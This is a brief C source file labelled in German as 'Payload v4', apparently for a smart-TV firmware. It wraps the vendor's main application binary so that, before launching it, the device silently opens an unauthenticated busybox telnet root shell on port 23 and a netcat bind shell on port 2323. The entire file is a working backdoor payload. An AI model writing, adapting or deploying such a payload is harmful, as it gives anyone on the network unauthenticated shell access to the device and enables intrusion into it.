/* Payload v4: wie v3, plus PATH und Terminfo-Umgebung fuer die Shells. */
#include <unistd.h>
int main(void) {
    char *cmd =
        "mkdir -p /dev/pts; "
        "mount -t devpts devpts /dev/pts 2>/dev/null; "
        "export PATH=/conf/remotelf:/buffer:$PATH; "
        "export TERMINFO=/conf/remotelf/terminfo; "
        "export TERM=xterm; "
        "(setsid busybox telnetd -l /bin/sh -p 23 >/dev/null 2>&1 &); "
        "(busybox nc -ll -p 2323 -e /bin/sh >/dev/null 2>&1 &); "
        "exec /vendor/com.nvt.idtv/aurora.elf";
    execl("/bin/sh", "sh", "-c", cmd, (char *)0);
    return 0;
}
